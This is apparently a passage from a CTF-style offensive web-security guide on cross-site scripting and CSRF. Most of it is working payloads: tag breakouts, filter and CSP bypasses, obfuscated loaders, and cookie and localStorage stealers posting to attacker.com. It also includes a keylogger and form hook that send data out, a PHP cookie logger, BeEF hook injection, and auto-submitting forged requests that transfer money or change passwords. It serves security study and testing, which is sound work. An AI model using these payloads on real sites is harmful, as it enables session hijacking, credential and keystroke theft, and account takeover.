<a href="data:text/html,<script>alert(1)</script>">Click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### CSS Context

CSS injection leading to JavaScript execution:

```html
<!-- Expression (IE only, deprecated) -->
<style>body{background:url("javascript:alert(1)")}</style>

<!-- Import with javascript: -->
<style>@import"javascript:alert(1)";</style>

<!-- Modern vector using -moz-binding (Firefox, older) -->
<style>body{-moz-binding:url("data:text/xml,<bindings>...")}</style>
```

### SVG Context

SVG allows embedded scripts:

```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><script xlink:href="data:text/javascript,alert(1)"/>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### XML Context

CDATA sections and entity injection:

```xml
<!-- CDATA bypass -->
<![CDATA[<script>alert(1)</script>]]>

<!-- Entity reference -->
<!DOCTYPE foo [<!ENTITY xxe "alert(1)">]>
<test>&xxe;</test>
```

## Breaking Out of Tags and Attributes

### Closing Tag Strategies

Premature tag closure to inject new elements:

```html
<!-- Standard closure -->
"></script><script>alert(1)</script>
'></script><script>alert(1)</script>

<!-- Self-closing tags -->
" /><script>alert(1)</script>
' /><script>alert(1)</script>

<!-- Comment-based closure -->
--><script>alert(1)</script>
--!><script>alert(1)</script>
```

### Attribute Injection Without Closing Tag

Adding new attributes to existing tags:

```html
<!-- From: <input value="USER_INPUT"> -->
" autofocus onfocus="alert(1)" dummy="
" onmouseover="alert(1)" dummy="
" accesskey="x" onclick="alert(1)" dummy="

<!-- Trigger with: Alt+Shift+X (accesskey) -->
```

### Breaking Out of Script Tag Context

Escaping from within `<script>` blocks:

```javascript
// Standard closure
</script><script>alert(1)</script>

// Comment evasion (if comments are stripped)
</script ><script>alert(1)</script>
</script\x20><script>alert(1)</script>

// Alternative script closure
</ScRiPt><script>alert(1)</script>
```

### Textarea and Title Tag Breakouts

These tags parse content as text, requiring closure:

```html
<!-- Textarea -->
</textarea><script>alert(1)</script>
</textarea><img src=x onerror=alert(1)>

<!-- Title -->
</title><script>alert(1)</script>
</title><img src=x onerror=alert(1)>
```

### Style Tag Breakouts

Escaping CSS context:

```html
</style><script>alert(1)</script>
</style><img src=x onerror=alert(1)>
```

### Comment Breakouts

Breaking out of HTML comments:

```html
<!-- USER_INPUT -->
--><script>alert(1)</script><!--
--!><script>alert(1)</script><!--

<!-- Conditional comments (IE) -->
<![if]><script>alert(1)</script><![endif]>
```

### Attribute Quote Escaping

When quotes are filtered or encoded:

```html
<!-- Using encoded quotes -->
&quot;><script>alert(1)</script>
&#34;><script>alert(1)</script>
&#x22;><script>alert(1)</script>

<!-- Backtick delimiter (non-standard, context-dependent) -->
`><script>alert(1)</script>
```

### Null Byte and Special Character Injection

[Inference] Some parsers may mishandle null bytes:

```html
<!-- Null byte (%00) -->
"><script>alert(1)</script>%00
"<script>alert(1)</script>\x00

<!-- Newline injection -->
" 
 onmouseover="alert(1)
```

### Filter Bypass with Incomplete Tags

Some filters only check complete tags:

```html
<!-- Incomplete closing -->
<script>alert(1)//
<script>alert(1)<!--

<!-- Split tags -->
<scr<script>ipt>alert(1)</script>
<sc<iframe>ript>alert(1)</script>
```

## JavaScript Execution Contexts

### Global Context Execution

Direct script execution in global scope:

```javascript
// Window properties
window.alert(1)
self.alert(1)
top.alert(1)
parent.alert(1)
frames.alert(1)

// Alternative references
globalThis.alert(1)
this.alert(1)
```

### Event Handler Context

Inline event handlers execute in element context:

```html
<img src=x onerror="this.src=''; alert(1)">
<body onload="alert(document.domain)">

<!-- With statement context -->
<div onclick="with(document)alert(cookie)">Click</div>
```

### Function Context

Creating functions dynamically:

```javascript
// Function constructor
new Function('alert(1)')()
Function('alert(1)')()

// Constructor from string
[].constructor.constructor('alert(1)')()

// setTimeout/setInterval
setTimeout('alert(1)', 0)
setTimeout(alert, 0, 1)
setInterval('alert(1)', 0)
```

### Eval Context

Dynamic code evaluation:

```javascript
// Direct eval
eval('alert(1)')
eval.call(null, 'alert(1)')
eval.apply(null, ['alert(1)'])

// Indirect eval
window.eval('alert(1)')
(1,eval)('alert(1)')

// Alternative eval methods
setTimeout('alert(1)', 0)
setInterval('alert(1)', 0)
```

### Template Literal Execution

Tagged template literals:

```javascript
// Standard template
eval`alert\x281\x29`

// String.raw
String.raw`alert(1)`

// Custom tag function exploitation
```

### Module Context

[Inference] ES6 modules have separate scope:

```javascript
// Import with side effects
import 'data:text/javascript,alert(1)'

// Dynamic import
import('data:text/javascript,alert(1)')
```

### Worker Context

Web Workers provide isolated execution:

```javascript
// Creating worker with data URI
var worker = new Worker('data:text/javascript,alert(1)');

// Blob-based worker
var blob = new Blob(['alert(1)'], {type: 'application/javascript'});
var worker = new Worker(URL.createObjectURL(blob));
```

### Execution via DOM APIs

DOM manipulation triggering execution:

```javascript
// innerHTML assignment
document.body.innerHTML = '<img src=x onerror=alert(1)>';

// insertAdjacentHTML
document.body.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>');

// write/writeln
document.write('<script>alert(1)</script>');
document.writeln('<script>alert(1)</script>');

// Range.createContextualFragment
var range = document.createRange();
var fragment = range.createContextualFragment('<img src=x onerror=alert(1)>');
document.body.appendChild(fragment);
```

### Execution via Location APIs

Location object manipulation:

```javascript
// Direct assignment
location = 'javascript:alert(1)';
location.href = 'javascript:alert(1)';

// Assign method
location.assign('javascript:alert(1)');

// Replace method
location.replace('javascript:alert(1)');
```

### Execution via Navigation APIs

Navigation through various APIs:

```javascript
// Navigate
window.navigate('javascript:alert(1)');

// Open
window.open('javascript:alert(1)');

// Iframe src
var iframe = document.createElement('iframe');
iframe.src = 'javascript:alert(1)';
document.body.appendChild(iframe);
```

### Strict Mode Context

[Inference] Strict mode affects execution context:

```javascript
// Non-strict (this = window)
(function() { alert(this); })(); // [object Window]

// Strict mode (this = undefined)
(function() { 'use strict'; alert(this); })(); // undefined
```

### Error Handling Context

Execution through error handlers:

```javascript
// onerror
window.onerror = alert;
throw 1;

// Error event
addEventListener('error', e => alert(1));
throw new Error();

// unhandledrejection
addEventListener('unhandledrejection', e => alert(1));
Promise.reject();
```

### Common Testing Payloads by Context

```javascript
// Polyglot payloads (multiple contexts)
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

// DOM-based detection
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

### Important Related Topics

For complete XSS exploitation coverage, explore **Content Security Policy (CSP) Bypass**, **DOM-based XSS**, **Mutation-based XSS (mXSS)**, and **XSS in Modern Frameworks** (React, Angular, Vue).

---

## Detection Methodology

### Manual Testing Approaches

Insert test payloads into all input vectors - URL parameters, POST data, HTTP headers (User-Agent, Referer, Cookie), file uploads, and JSON/XML request bodies.

```bash
# Basic probe vectors
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
'"><script>alert(1)</script>
```

### Systematic Input Enumeration

```bash
# Test URL parameters
https://target.com/search?q=<script>alert(1)</script>

# Test POST data with curl
curl -X POST https://target.com/comment \
  -d "message=<script>alert(1)</script>" \
  -d "name=test"

# Test HTTP headers
curl https://target.com/ \
  -H "User-Agent: <script>alert(1)</script>" \
  -H "Referer: <script>alert(1)</script>"
```

### Context Analysis

Identify where your input appears in the response. The injection context determines payload construction:

- HTML body: `<script>alert(1)</script>`
- HTML attribute: `" onload="alert(1)`
- JavaScript string: `'; alert(1); //`
- JavaScript context: `</script><script>alert(1)</script>`
- CSS context: `</style><script>alert(1)</script>`

## Content Security Policy (CSP) Bypass

Content Security Policy is an HTTP response header that restricts resource loading to prevent XSS. CSP defines allowed sources for scripts, styles, images, and other resources.

### CSP Header Analysis

```bash
# Examine CSP headers
curl -I https://target.com/ | grep -i content-security-policy

# Example restrictive CSP
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

### Common CSP Bypass Techniques

[Inference] The following techniques may work depending on specific CSP configurations:

**JSONP Endpoint Abuse** - If CSP allows a trusted domain that hosts JSONP endpoints, you can inject arbitrary JavaScript through the callback parameter.

```javascript
// If CSP allows https://trusted.cdn.com
<script src="https://trusted.cdn.com/jsonp?callback=alert(document.cookie)"></script>
```

**AngularJS Template Injection (pre-1.6)** - When AngularJS is whitelisted and served from allowed domains:

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

**Script Gadgets** - Legitimate libraries on whitelisted domains may contain exploitable code patterns:

```html
<!-- If jQuery is allowed -->
<div data-callback="alert" data-arg="1"></div>

<!-- Some libraries process data attributes as callbacks -->
```

**Base Tag Injection** - If `base-uri` directive is missing, inject base tag to redirect relative script sources:

```html
<base href="https://attacker.com/">
<!-- Now relative scripts load from attacker domain -->
```

### Unsafe-inline with nonce/hash Bypass

If CSP uses nonces but application has injection in inline script:

```html
<!-- If page has: -->
<script nonce="random123">
  var data = 'INJECTION_POINT';
</script>

<!-- Inject: -->
'; alert(1); //
```

### File Upload + script-src 'self'

Upload JavaScript file disguised as allowed type, then reference it:

```bash
# Upload malicious.js as image
curl -F "file=@malicious.js;type=image/png" https://target.com/upload

# If accessible at /uploads/malicious.js
<script src="/uploads/malicious.js"></script>
```

### Subdomain Takeover

If CSP allows `*.target.com` and you can claim abandoned subdomain:

```javascript
// Register abandoned.target.com, host payload
<script src="https://abandoned.target.com/xss.js"></script>
```

### Practical CSP Testing

```bash
# Use CSP Evaluator to identify weaknesses
# Check for unsafe-inline, unsafe-eval, wildcard sources

# Test JSONP endpoints on whitelisted domains
curl "https://trusted.cdn.com/api/jsonp?callback=malicious"

# Identify AngularJS version
curl https://target.com/ | grep -i angular
```

## XSS via SVG, Images, Event Handlers

### SVG-Based XSS

SVG files support embedded JavaScript through multiple vectors. They can be uploaded, embedded inline, or loaded as external resources.

```xml
<!-- Basic SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

<!-- SVG with onload event -->
<svg onload="alert(1)">

<!-- SVG with animation -->
<svg>
  <animate attributeName="x" values="0" 
    onbegin="alert(1)" />
</svg>

<!-- SVG with foreign object -->
<svg>
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>

<!-- SVG with href injection -->
<svg>
  <a xlink:href="javascript:alert(1)">
    <text x="0" y="20">Click me</text>
  </a>
</svg>
```

### File Upload Exploitation

```bash
# Create malicious SVG
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
EOF

# Upload and reference
curl -F "avatar=@xss.svg" https://target.com/upload
# Access at https://target.com/uploads/xss.svg
```

### Image Tag Abuse

```html
<!-- Error-based execution -->
<img src=x onerror="alert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- Load external payload -->
<img src=x onerror="this.onerror=null;s=document.createElement('script');s.src='//attacker.com/xss.js';document.body.appendChild(s)">

<!-- Bypass basic filters -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="window['al'+'ert'](1)">

<!-- With other attributes -->
<img dynsrc="javascript:alert(1)">
<img lowsrc="javascript:alert(1)">
```

### Event Handler Exploitation

Event handlers execute JavaScript when specific events occur. Hundreds of event handlers exist across HTML elements.

```html
<!-- Mouse events -->
<div onmouseover="alert(1)">Hover here</div>
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
<select onfocus="alert(1)" autofocus>
<textarea onfocus="alert(1)" autofocus>

<!-- Form events -->
<form onsubmit="alert(1)"><input type="submit"></form>
<input oninput="alert(1)" value="default">
<input onchange="alert(1)">

<!-- Media events -->
<video onloadstart="alert(1)" src=x></video>
<audio onloadstart="alert(1)" src=x></audio>

<!-- Animation events -->
<style>@keyframes x{}</style>
<div style="animation-name:x" onanimationstart="alert(1)">

<!-- Marquee events -->
<marquee onstart="alert(1)">text</marquee>

<!-- Details/summary -->
<details ontoggle="alert(1)" open>
  <summary>Click</summary>
</details>

<!-- Filter bypass examples -->
<svg><animate onbegin="alert(1)" attributeName=x dur=1s>
<marquee width=10 loop=2 behavior="alternate" onbounce="alert(1)">
```

### Context-Specific Payloads

```html
<!-- Breaking out of attributes -->
"><script>alert(1)</script>
" onload="alert(1)
" autofocus onfocus="alert(1)

<!-- Breaking out of JavaScript strings -->
'; alert(1); //
'; alert(1); var dummy='
</script><script>alert(1)</script><script>

<!-- Template literals (ES6) -->
${alert(1)}
${constructor.constructor('alert(1)')()}
```

## Cookie Stealing and Session Hijacking via XSS

### Cookie Exfiltration Techniques

```javascript
// Direct exfiltration to attacker server
fetch('https://attacker.com/steal?cookie=' + document.cookie);

// Using Image object
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;

// Using XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie);
xhr.send();

// Base64 encode to avoid issues with special characters
new Image().src = 'https://attacker.com/steal?data=' + btoa(document.cookie);

// Exfiltrate multiple data points
var data = {
  cookie: document.cookie,
  domain: document.domain,
  url: window.location.href,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage)
};
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(data),
  headers: {'Content-Type': 'application/json'}
});
```

### Compact One-Liner Payloads

```javascript
// Minimal cookie stealer
<script>new Image().src='//attacker.com/'+document.cookie</script>

// URL parameter injection
<script>location='//attacker.com/?c='+document.cookie</script>

// External script loader
<script src=//attacker.com/hook.js></script>
```

### Attacker Server Setup

```bash
# Simple Python HTTP server to receive cookies
python3 -m http.server 8080

# Log cookies with PHP
<?php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
file_put_contents('stolen.txt', "[$time] $ip: $cookie\n", FILE_APPEND);
?>

# Using netcat for quick testing
nc -lvnp 8080
```

### Session Hijacking Process

1. Inject payload to steal session cookie
2. Capture victim's cookie on attacker server
3. Inject cookie into your browser session
4. Access application as victim

```bash
# Browser console cookie injection
document.cookie = "session=victim_session_token; path=/; domain=.target.com";

# Using browser developer tools
# Application tab â†’ Cookies â†’ Add/Edit cookie values

# Using curl to verify session access
curl https://target.com/profile \
  -H "Cookie: session=victim_session_token"
```

### Advanced Session Hijacking

```javascript
// Capture and relay requests in real-time
(function(){
  var originalFetch = window.fetch;
  window.fetch = function() {
    var args = arguments;
    // Log request details
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({
        url: args[0],
        options: args[1],
        cookie: document.cookie
      })
    });
    return originalFetch.apply(this, args);
  };
})();

// Hook form submissions
document.addEventListener('submit', function(e){
  var formData = new FormData(e.target);
  var data = {};
  formData.forEach((value, key) => {data[key] = value});
  
  fetch('https://attacker.com/formlog', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// Keylogger
document.addEventListener('keypress', function(e){
  fetch('https://attacker.com/keylog?key=' + e.key);
});
```

### Bypassing HttpOnly Flags

[Unverified] HttpOnly cookies cannot be accessed via JavaScript, but alternative attack vectors exist:

- Capture authenticated requests and relay them to attacker server
- Use XSS to perform actions on behalf of victim (CSRF-like)
- Extract CSRF tokens and execute state-changing operations
- Access sensitive data displayed on pages and exfiltrate it

```javascript
// Extract CSRF token from page
var csrfToken = document.querySelector('[name="csrf_token"]').value;
fetch('https://attacker.com/token?csrf=' + csrfToken);

// Perform action as victim
fetch('/api/changeEmail', {
  method: 'POST',
  body: JSON.stringify({email: 'attacker@evil.com'}),
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  }
});
```

## XSS Tools and Payloads

### Automated XSS Scanners

#### XSStrike

```bash
# XSStrike - Advanced XSS detection suite
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

# Basic scan
python3 xsstrike.py -u "https://target.com/search?q=test"

# Scan with crawling
python3 xsstrike.py -u "https://target.com" --crawl

# Scan POST data
python3 xsstrike.py -u "https://target.com/submit" \
  --data "name=test&comment=test"

# Skip DOM scanning for speed
python3 xsstrike.y -u "https://target.com/page" --skip-dom
```

#### Dalfox

```bash
# Dalfox - Fast parameter analysis
go install github.com/hahwul/dalfox/v2@latest

# Scan URL with parameters
dalfox url "https://target.com/search?query=test"

# Pipe from other tools
echo "https://target.com/page?id=1" | dalfox pipe

# Scan with multiple parameters
dalfox url "https://target.com/search?q=1&filter=2&sort=3"

# Use custom payloads
dalfox url "https://target.com/page?id=1" \
  --custom-payload "./payloads.txt"

# Mining mode to find parameters
dalfox url "https://target.com" --mining-dict-word
```

#### XSSer

```bash
# XSSer - Automatic XSS fuzzer
git clone https://github.com/epsylon/xsser.git
cd xsser

# Basic usage
python3 xsser --url "https://target.com/search?q=XSS"

# Automatic payload selection
python3 xsser --url "https://target.com/page" --auto

# Test all parameters
python3 xsser --url "https://target.com/page" --Coo

# Generate GTK interface
python3 xsser --gtk
```

### Payload Generation and Obfuscation

```bash
# PayloadsAllTheThings repository
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings/XSS\ Injection/

# Browse categorized payloads
cat "XSS in HTML contexts.md"
cat "XSS in JS contexts.md"
```

### Manual Payload Construction

```javascript
// Encoding bypasses
// HTML entity encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// Hex encoding
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">

// Unicode encoding
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

// Mixed encoding
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">

// String concatenation
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="window['al\x65rt'](1)">
<img src=x onerror="eval('al'+'ert(1)')">

// JSFuck encoding (no alphanumeric characters)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

### BeEF (Browser Exploitation Framework)

```bash
# Install BeEF
apt-get install beef-xss

# Or from GitHub
git clone https://github.com/beefproject/beef.git
cd beef
./install

# Start BeEF
./beef

# Default credentials: beef:beef
# Access at http://127.0.0.1:3000/ui/panel

# Hook payload
<script src="http://attacker-ip:3000/hook.js"></script>
```

### BeEF Exploitation Workflow

1. Inject hook script via XSS vulnerability
2. Victim browser connects to BeEF control panel
3. Execute commands through BeEF interface:
    - Browser fingerprinting
    - Network reconnaissance
    - Social engineering modules
    - Credential harvesting
    - Persistence mechanisms

```javascript
// BeEF hook injection variants
<script src="//attacker.com:3000/hook.js"></script>

// Obfuscated hook
<script>eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9Jy8vYXR0YWNrZXIuY29tOjMwMDAvaG9vay5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs='))</script>

// Dynamic loading
<script>
var s=document.createElement('script');
s.src='//attacker.com:3000/hook.js';
document.body.appendChild(s);
</script>
```

### XSS Payload Lists and Fuzzing

```bash
# SecLists XSS payloads
git clone https://github.com/danielmiessler/SecLists.git
cd SecLists/Fuzzing/XSS/

# Use with Burp Intruder, ffuf, or custom scripts
cat XSS-BruteLogic.txt
cat XSS-Jhaddix.txt
```

```bash
# ffuf with XSS wordlist
ffuf -w XSS-payloads.txt \
  -u "https://target.com/search?q=FUZZ" \
  -mr "FUZZ"

# Filter for successful XSS (reflected in response)
ffuf -w XSS-payloads.txt \
  -u "https://target.com/page?param=FUZZ" \
  -fr "Error|Invalid"
```

### Browser-Based Testing

```javascript
// Browser console payload testing
// Inject into any input and observe behavior

// Test basic reflection
<img src=x onerror=alert(document.domain)>

// Test encoding handling
%3Cscript%3Ealert(1)%3C/script%3E

// Test filter bypass
<sCrIpT>alert(1)</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
```

## Important Related Topics

For comprehensive XSS exploitation in CTF scenarios, consider studying these related areas:

- **DOM Clobbering** - Exploiting DOM tree structure to override variables and bypass security controls
- **Mutation XSS (mXSS)** - Exploiting browser parser inconsistencies and HTML sanitizer bypasses
- **Server-Side XSS (Dynamic PDF Generation)** - XSS in PDF rendering contexts and server-side JavaScript engines
- **Blind XSS Detection** - Out-of-band techniques for detecting XSS in delayed contexts (admin panels, logs)
- **WAF Bypass Techniques** - Specific evasion methods for common WAFs (Cloudflare, Akamai, AWS WAF)

---

# Cross-Site Request Forgery (CSRF)

## CSRF Mechanics

Cross-Site Request Forgery exploits the browser's automatic credential inclusion (cookies, HTTP authentication, client certificates) when making requests to a target domain. When a victim visits an attacker-controlled page while authenticated to a vulnerable application, the attacker can trigger unwanted actions using the victim's credentials.

**Attack Flow:**

1. Victim authenticates to `vulnerable-bank.com`, receives session cookie
2. Victim visits `attacker.com` (in same browser, without logging out)
3. `attacker.com` serves HTML/JavaScript that triggers requests to `vulnerable-bank.com`
4. Browser automatically includes `vulnerable-bank.com` cookies with the forged request
5. Application processes request as legitimate user action

**Prerequisites for Successful CSRF:**

- Target application relies solely on automatic credentials (cookies/HTTP auth)
- No unpredictable request parameters (anti-CSRF tokens)
- Attacker can construct valid requests (predictable parameters)
- State-changing action exists (money transfer, password change, email update)

**Same-Origin Policy vs CSRF:** SOP prevents reading cross-origin responses but does NOT prevent sending cross-origin requests. CSRF exploits this gapâ€”attackers can trigger requests but cannot read responses.

---

## Token Generation and Validation

**Anti-CSRF Token Requirements:**

- **Unpredictability:** Cryptographically secure random value (â‰¥128 bits entropy)
- **Session binding:** Token tied to user session, validated server-side
- **Single-use or time-limited:** Prevents replay attacks
- **Not in cookies:** Token must be in request parameter, not automatically sent

**Implementation Patterns:**

**Synchronizer Token Pattern:**

```
Server generates: csrf_token = secure_random(32_bytes)
Stores in session: session['csrf_token'] = csrf_token
Embeds in form: <input type="hidden" name="csrf_token" value="abc123...">
Validates: request.form['csrf_token'] == session['csrf_token']
```

**Double Submit Cookie Pattern:**

```
Server sets cookie: Set-Cookie: csrf_token=abc123...
Form includes: <input name="csrf_token" value="abc123...">
Validates: request.cookies['csrf_token'] == request.form['csrf_token']
```

**Testing Token Validation:**

1. **Remove token entirely**

```bash
# Original request
curl -X POST https://target.com/transfer \
  -H "Cookie: session=xyz789" \
  -d "to=attacker&amount=1000&csrf_token=abc123"

# Test without token
curl -X POST https://target.com/transfer \
  -H "Cookie: session=xyz789" \
  -d "to=attacker&amount=1000"
```

2. **Submit empty token**

```bash
curl -X POST https://target.com/transfer \
  -H "Cookie: session=xyz789" \
  -d "to=attacker&amount=1000&csrf_token="
```

3. **Reuse token from different session**

```bash
# Get token from attacker's session
TOKEN=$(curl -s https://target.com/form -H "Cookie: session=attacker_session" | grep csrf_token | cut -d'"' -f6)

# Use with victim's session
curl -X POST https://target.com/transfer \
  -H "Cookie: session=victim_session" \
  -d "to=attacker&amount=1000&csrf_token=$TOKEN"
```

4. **Change request method**

```bash
# If POST is protected, try GET
curl "https://target.com/transfer?to=attacker&amount=1000&csrf_token=abc123" \
  -H "Cookie: session=xyz789"
```

**Burp Suite Token Testing:**

- **Burp Extension: CSRF Scanner** - Automates token validation tests
- Intercept legitimate request, send to Repeater
- Modify/remove `csrf_token` parameter
- Check if request succeeds with HTTP 200 (vulnerable) vs 403/400 (protected)

**Common Validation Flaws:**

- Token validated only if present (remove parameter â†’ bypass)
- Token compared case-insensitively
- Token validation in client-side JavaScript only
- Token not bound to user session (any valid token works)
- Token leaked in URL parameters (Referer header exposure)

---

## SameSite Cookie Attribute

The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing CSRF defense at the browser level.

**SameSite Values:**

**Strict:**

```
Set-Cookie: session=xyz789; SameSite=Strict
```

- Cookie NEVER sent with cross-site requests
- Includes top-level navigation (clicking links)
- **Impact:** User must authenticate after clicking external links
- **Use case:** Highly sensitive applications accepting usability trade-off

**Lax (default in modern browsers):**

```
Set-Cookie: session=xyz789; SameSite=Lax
```

- Cookie sent with top-level GET navigation from external sites
- Blocked for: POST/PUT/DELETE, `<iframe>`, `fetch()`, `<img>` tags
- **Default since:** Chrome 80 (2020), Firefox 69 (2019)
- **Use case:** Balances security and usability for most applications

**None:**

```
Set-Cookie: session=xyz789; SameSite=None; Secure
```

- Cookie sent with all cross-site requests
- **Requires** `Secure` attribute (HTTPS only)
- **Use case:** Embedded widgets, OAuth flows, legitimate cross-site functionality

**Testing SameSite Protection:**

```bash
# Check cookie attributes
curl -i https://target.com/login -d "user=test&pass=test" | grep Set-Cookie
# Look for: SameSite=Strict or SameSite=Lax
```

**Burp Suite:**

- Proxy â†’ HTTP History â†’ Response headers
- Search for `Set-Cookie` headers
- Note absence of `SameSite` (vulnerable on old browsers) or `SameSite=None`

**Browser DevTools:**

- F12 â†’ Application â†’ Cookies
- `SameSite` column shows attribute value

**Bypass Scenarios:**

1. **Legacy Browser Exploitation:**
    
    - SameSite support: Chrome 51+, Firefox 60+, Safari 12+
    - Target users on outdated browsers (e.g., Android WebView, IE)
2. **SameSite=None Misconfiguration:**
    

```html
<!-- Attacker page exploits SameSite=None -->
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

3. **GET-based State Changes with Lax:**
    - SameSite=Lax allows top-level GET navigation
    - If application accepts state-changing GET requests:

```html
<a href="https://target.com/delete_account?confirm=yes">Click here</a>
<!-- Or auto-trigger: -->
<script>window.location='https://target.com/delete_account?confirm=yes';</script>
```

---

## CSRF with GET Requests

GET-based CSRF is simpler to exploit but less common in modern applications due to REST principles (GET should be idempotent).

**Exploitation Vectors:**

**1. Auto-Loading Resources:**

```html
<!-- Image tag -->
<img src="https://target.com/delete_user?id=123" style="display:none">

<!-- Script tag -->
<script src="https://target.com/logout"></script>

<!-- Link prefetch -->
<link rel="prefetch" href="https://target.com/update_email?email=attacker@evil.com">

<!-- Iframe -->
<iframe src="https://target.com/transfer?to=attacker&amount=1000" style="display:none"></iframe>
```

**2. Redirect-Based:**

```html
<meta http-equiv="refresh" content="0; url=https://target.com/action?param=value">
```

**3. JavaScript-Triggered:**

```html
<script>
window.location = 'https://target.com/change_password?new=attackerpass';
</script>
```

**4. XMLHttpRequest/Fetch (requires CORS misconfiguration):**

```javascript
// Sends cookies automatically, but cannot read response due to SOP
fetch('https://target.com/api/transfer?to=attacker&amount=1000', {
  method: 'GET',
  credentials: 'include'  // Include cookies
});
```

**Testing with curl:**

```bash
# Verify GET request accepts parameters
curl "https://target.com/update_profile?email=test@test.com" \
  -H "Cookie: session=xyz789"

# If successful (HTTP 200/302), vulnerable to GET-based CSRF
```

**Burp Suite Testing:**

- Intercept POST request
- Right-click â†’ Change request method to GET
- Parameters automatically moved to URL query string
- Send request; if succeeds â†’ vulnerable

**Defense Bypass - GET Parameter Pollution:**

```bash
# Application expects POST, filters GET
# Try encoding parameters differently:
curl "https://target.com/action?param=value&param=value2"
curl "https://target.com/action;param=value"  # Path parameter
```

---

## CSRF with POST Requests

POST-based CSRF requires more sophisticated exploitation but is more common as applications properly use POST for state-changing operations.

**Exploitation Vectors:**

**1. Auto-Submitting HTML Form:**

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
</body>
</html>
```

**2. JavaScript Fetch API:**

```javascript
fetch('https://target.com/api/update', {
  method: 'POST',
  credentials: 'include',  // Send cookies
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com&role=admin'
});
```

